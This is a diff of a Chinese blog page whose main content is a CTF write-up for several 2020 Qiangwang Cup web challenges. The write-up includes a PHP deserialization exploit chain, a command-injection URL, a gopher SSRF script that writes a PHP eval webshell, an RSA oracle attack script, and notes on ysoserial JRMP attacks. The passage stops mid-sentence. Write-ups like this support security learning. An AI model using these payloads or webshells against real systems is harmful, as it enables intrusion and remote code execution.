@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://igml.top">
-  <title>Tag: wp | gml&#39;s blog</title>
+  <title>2020 强网杯 writeup | gml&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="gml,博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="gml&#39;s blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;igml.top&#x2F;tags&#x2F;wp&#x2F;index.html">
+  <meta name="description" content="打完强网杯就去学校报道了，抽空补一下wp。 强网先锋-辅助反序列化逃逸，参考https:&#x2F;&#x2F;m0nit0r.top&#x2F;2020&#x2F;02&#x2F;05&#x2F;object-injection-caused-by-PHP-string-escape&#x2F;#Joomla%E9%80%83%E9%80%B8再加上绕过wakeup，以及反序列化中使用大写S可用十六进制表示的一些绕过方式。 需要注意调试的时候最好url编码，直接e">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 强网杯 writeup">
+<meta property="og:url" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;index.html">
 <meta property="og:site_name" content="gml&#39;s blog">
+<meta property="og:description" content="打完强网杯就去学校报道了，抽空补一下wp。 强网先锋-辅助反序列化逃逸，参考https:&#x2F;&#x2F;m0nit0r.top&#x2F;2020&#x2F;02&#x2F;05&#x2F;object-injection-caused-by-PHP-string-escape&#x2F;#Joomla%E9%80%83%E9%80%B8再加上绕过wakeup，以及反序列化中使用大写S可用十六进制表示的一些绕过方式。 需要注意调试的时候最好url编码，直接e">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;siixUdLyyYA0CgPrTYcrTGW7orUlSYJJg_fLnLixhR_ier_T5Vp-2Zmy_YK-LFgk2KQdudUfObrsfGQ9BPvh1F2kNp1AD_k_Wul3pWavrviitU88vtT9inzmxINfW0MlV4kBPqq0.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;nTFCbNjiuJVHnGXR8vO8p_hnw8wsgB44Hk3gjrbQYEVFEx1rYUMWP9UjIEmDYqQRo8fC3Q-zkoPiBcOY7qs37kmP3JKvklZkh1_5gLpx275KceTenCp89k1s1KVQuYAurHMFQwfh.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;vISYtt8fRrUQCho2750osAU6hqwZbV7_SUbI0hlWzE-YX_EqfbIXwLCASw-BmITL1Dq31AQbg3erETg5H9Mixh4l9Bn8SVNajF1ZdSHTaEJVldYycZ9gGQw2T2kb4tRoxO28fXf8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;mx6vGXjZXUUflp5AP0Z0WvoOtC5ZqvWK6uTonALgu4hge9t9ICuU2ddWXRjjfExkb189jfdGr7utxt0CRxTxH8Ie8nwG61orWAHMTptSErbdA_pJv7Fm7FFCA3TpovnWcR86eEFO.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;_gAfmqOdjoVnYmOE7adLGWuG421pv3lcMSV8qkh-UXTSgamY86vdzfUXP8JEB4sfGobl8DOwJAUxvCMMKgTf5_AJ_jZd9AR5gMkpjveloK8d3CO25InB3QpqHCZHOxnyFgGsc1Uw.png">
+<meta property="og:updated_time" content="2020-08-28T08:41:39.211Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;08&#x2F;28&#x2F;2020-qwb&#x2F;siixUdLyyYA0CgPrTYcrTGW7orUlSYJJg_fLnLixhR_ier_T5Vp-2Zmy_YK-LFgk2KQdudUfObrsfGQ9BPvh1F2kNp1AD_k_Wul3pWavrviitU88vtT9inzmxINfW0MlV4kBPqq0.png">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -155,103 +164,89 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-2020-qwb" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/29/2020-TCTF-0CTF/" class="archive-article-date">
-  	<time datetime="2020-06-29T09:05:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-29</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/29/2020-TCTF-0CTF/">2020 TCTF/0CTF 部分wp</a>
+    <h1 class="article-title" itemprop="name">
+      2020 强网杯 writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/Web//" class="article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/04/2019-de1ctf/" class="archive-article-date">
-  	<time datetime="2019-08-04T15:18:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-04</time>
+        
+        <a href="/2020/08/28/2020-qwb/" class="archive-article-date">
+  	<time datetime="2020-08-28T08:30:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-28</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/04/2019-de1ctf/">2019 de1ctf</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打完强网杯就去学校报道了，抽空补一下wp。</p>
+<h3 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h3><p>反序列化逃逸，参考<a href="https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomla逃逸" target="_blank" rel="noopener">https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomla%E9%80%83%E9%80%B8</a>再加上绕过wakeup，以及反序列化中使用大写S可用十六进制表示的一些绕过方式。</p>
+<p>需要注意调试的时候最好url编码，直接echo \0 无法显示，算覆盖长度的时候容易出错。</p>
+<a id="more"></a>
 
-        <div class="article-info info-on-right">
-          
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $user;</span><br><span class="line">   <span class="keyword">protected</span> $pass;</span><br><span class="line">   <span class="keyword">protected</span> $admin;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</span><br><span class="line">           $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">           $name();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name = <span class="string">""</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</span><br><span class="line">       system(<span class="string">"cat /flag"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;KS();</span><br><span class="line">       <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">   $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">   <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> jungle(<span class="string">'gml'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> midsolo($a);</span><br><span class="line">$c = <span class="keyword">new</span> topsolo($b);</span><br><span class="line">$data = <span class="string">'O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3Bs%3A3%3A%22gml%22%3B%7D%7D%7D'</span>;</span><br><span class="line">$data = urldecode($data);</span><br><span class="line">$data = <span class="string">'gml";s:8:"password";'</span>.$data.<span class="string">'&#125;'</span>;</span><br><span class="line">$username = <span class="string">'gml\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0'</span>;</span><br><span class="line">$password = urlencode($data);</span><br><span class="line"><span class="keyword">echo</span> $username.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $password;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="强网先锋-主动"><a href="#强网先锋-主动" class="headerlink" title="强网先锋-主动"></a>强网先锋-主动</h3><p>[<a href="http://39.96.23.228:10002/?ip=;cat%20*]" target="_blank" rel="noopener">http://39.96.23.228:10002/?ip=;cat%20*]</a>(<a href="http://39.96.23.228:10002/?ip=;cat" target="_blank" rel="noopener">http://39.96.23.228:10002/?ip=;cat</a> *)</p>
+<h3 id="强网先锋-Funhash"><a href="#强网先锋-Funhash" class="headerlink" title="强网先锋-Funhash"></a>强网先锋-Funhash</h3><p>Md4那个绕过，需要字符0e开头，后面都是数字，并且md4的结果需要是 0e[0-9]{30} 的形式。<a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4里面有现成的数。第二关数组绕过，数据库那个应该找到一个字符串，md5含有" target="_blank" rel="noopener">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4里面有现成的数。第二关数组绕过，数据库那个应该找到一个字符串，md5含有</a> ‘or’这种，一番搜索在<a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes里找到了现成的数。[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)" target="_blank" rel="noopener">https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes里找到了现成的数。[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)</a></p>
+<h3 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h3><p>Ob_end_clean 导致什么也不会输出，需要触发异常直接退出，才能绕过。要反序列化两个对象，第一个用来取到$flag，第二个用全局 $this 触发异常，这样就会输出了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$sex,$num)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;num = $num;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">Array</span>(<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">'read'</span>,<span class="string">'result'</span>),<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">'read'</span>,this));</span><br><span class="line"><span class="keyword">print</span> serialize($b);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/28/2020-qwb/siixUdLyyYA0CgPrTYcrTGW7orUlSYJJg_fLnLixhR_ier_T5Vp-2Zmy_YK-LFgk2KQdudUfObrsfGQ9BPvh1F2kNp1AD_k_Wul3pWavrviitU88vtT9inzmxINfW0MlV4kBPqq0.png" alt="img"></p>
+<p>Url二次编码读flag不成功，然后发现40000端口开着web服务，html代码就post一个file和content，应该是写文件。接下来就是写shell了，写了三个多小时。。。疯狂尝试，发现有WAF，所以用php://filter/convert.base64-decode/resource 搭配base64编码来写，但是貌似过滤了=这些，凑了个没有=的payload。而且文件不是直接写到uploads目录，访问index.php返回一个set-cookie,是写到了PHPSESSID的值对应的文件夹下，所以gopher发包要指定PHPSESSID，这个坑了很久。。生成gopher payload的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">exp=<span class="string">'''POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.26.98.147</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span></span><br><span class="line"><span class="string">Accept: */*;</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=gml</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 95</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">file=php://filter/convert.base64-decode/resource=gml.php&amp;content=PD89QGV2YWwoJF9HRVRbMl0pOz8%2b'''</span></span><br><span class="line"><span class="comment"># print exp.split("\n")</span></span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">tmp = tmp.replace(<span class="string">"%0A"</span>,<span class="string">"%0D%0A"</span>)</span><br><span class="line"> </span><br><span class="line">result = <span class="string">"_"</span>+urllib.quote(tmp)</span><br><span class="line"> </span><br><span class="line">result=<span class="string">"gopher://172.26.98.147:40000/"</span>+result</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
+
+<p>打过去：</p>
+<p><img src="/2020/08/28/2020-qwb/nTFCbNjiuJVHnGXR8vO8p_hnw8wsgB44Hk3gjrbQYEVFEx1rYUMWP9UjIEmDYqQRo8fC3Q-zkoPiBcOY7qs37kmP3JKvklZkh1_5gLpx275KceTenCp89k1s1KVQuYAurHMFQwfh.png" alt="img"></p>
+<p>可以 getshell：</p>
+<p><img src="/2020/08/28/2020-qwb/vISYtt8fRrUQCho2750osAU6hqwZbV7_SUbI0hlWzE-YX_EqfbIXwLCASw-BmITL1Dq31AQbg3erETg5H9Mixh4l9Bn8SVNajF1ZdSHTaEJVldYycZ9gGQw2T2kb4tRoxO28fXf8.png" alt="img"></p>
+<h3 id="Dice2cry"><a href="#Dice2cry" class="headerlink" title="Dice2cry"></a>Dice2cry</h3><p>向abi.php发了post请求，没有其他功能，试一下源码泄漏，abi.php.bak有源码。abi.php里是一个类似RSA parity oracle的东西，但是他需要 $_POST[‘this_is.able’] 来设置密文经尝试，用 this[is.able 可以绕过 php 对 . 的过滤</p>
+<p>贴上队友 mcfx 大佬的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie=<span class="string">'PHPSESSID=0ctstv9ecqte01n2nkj8fi8744; encrypto_flag=79113663305747837143444307328467025244358133313438256571587025766714023427438759740177304646998782229997099583059263540140676001606304937372556988230412073815119853730057831488053981148795567089107250487727369425980217048609105153253967274624991296087058702050452905877610820679017736577755477024222115641775; public_n=8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157; public_e=010001'</span></span><br><span class="line">hd=&#123;<span class="string">'cookie'</span>:cookie&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getval</span><span class="params">(x)</span>:</span></span><br><span class="line">	dt=&#123;<span class="string">'this[is.able'</span>:x&#125;</span><br><span class="line">	r=requests.post(<span class="string">'http://106.14.66.189/abi.php'</span>,headers=hd,data=dt)</span><br><span class="line">	<span class="keyword">return</span> r.json()[<span class="string">'num'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookie.split(<span class="string">'; '</span>):</span><br><span class="line">	a,b=i.split(<span class="string">'='</span>)</span><br><span class="line">	<span class="keyword">if</span> a==<span class="string">'encrypto_flag'</span>:</span><br><span class="line">		enc_flag=int(b)</span><br><span class="line">	<span class="keyword">elif</span> a==<span class="string">'public_n'</span>:</span><br><span class="line">		n=int(b,<span class="number">16</span>)</span><br><span class="line">	<span class="keyword">elif</span> a==<span class="string">'public_e'</span>:</span><br><span class="line">		e=int(b,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> getval(<span class="number">0</span>)==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag3=getval(enc_flag)</span><br><span class="line">n3=n%<span class="number">3</span></span><br><span class="line">curn=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">	a=<span class="number">3</span>**(pos+<span class="number">1</span>)</span><br><span class="line">	b=pow(a,e,n)</span><br><span class="line">	t3=getval(enc_flag*b%n)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">		<span class="keyword">if</span> (flag3*a-n3*(curn*<span class="number">3</span>+i))%<span class="number">3</span>==t3:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	curn=curn*<span class="number">3</span>+i</span><br><span class="line">	l=curn*n//a</span><br><span class="line">	r=(curn*n+n<span class="number">-1</span>)//a</span><br><span class="line">	print(pos,l,r)</span><br><span class="line">	<span class="keyword">if</span> l+<span class="number">1</span>==r:</span><br><span class="line">		print(r.to_bytes(<span class="number">100</span>,<span class="string">'big'</span>))</span><br><span class="line">		exit()</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>Jdk 1.8，反序列化前有WAF。可以用ysoserial.exploit.JRMPListener CommonsCollections7打（6和7应该都可以），为了逃避检测，使用JRMP模拟RMI Client反打，参考：<a href="https://tiaotiaolong.net/2020/04/12/JRMPListener-&&-JRMPClient使用小记/" target="_blank" rel="noopener">https://tiaotiaolong.net/2020/04/12/JRMPListener-&amp;&amp;-JRMPClient%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</a>命令执行卡了很久，好像不能有引号，sh -c 后面的命令空格用${IFS}也死活不行，最后参考<a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a>，用$IFS$9才可以。。。测试的时候每次还需要换端口，一个端口第二次就不好用了，没有回连。Vps 上执行：</p>
